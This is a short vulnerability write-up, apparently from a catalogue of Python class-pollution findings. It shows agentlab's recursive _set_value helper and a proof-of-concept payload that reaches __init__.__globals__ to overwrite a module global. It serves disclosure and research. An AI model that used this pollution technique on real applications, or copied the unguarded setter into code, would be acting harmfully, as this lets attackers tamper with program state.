## agentlab

### Meta

+ Library: agentlab
+ Stars: 189
+ Version: v0.3.2
+ CVE: N/A
+ Status: Pending
+ Payload: ```_set_value(obj, ['__init__','__globals__', '__name__'], 'polluted')```
+ Foundby: redacted
+ Report: Pending
+ Type: App/Lib
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/ServiceNow/AgentLab

### Vulnerable Code Snippet

```python
def _set_value(obj, path, value):
    """Set the value of the given path in the given object to the given value."""
    for key in path[:-1]:
        if isinstance(obj, dict):
            obj = obj[key]
        else:
            obj = getattr(obj, key)
    if isinstance(obj, dict):
        obj[path[-1]] = value
    else:
        setattr(obj, path[-1], value)
```
### PoC

```python
from agentlab.experiments.args import _set_value
import subprocess
import random

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)

_set_value(obj, ['__init__','__globals__', '__name__'], 'polluted')
print(__name__)
```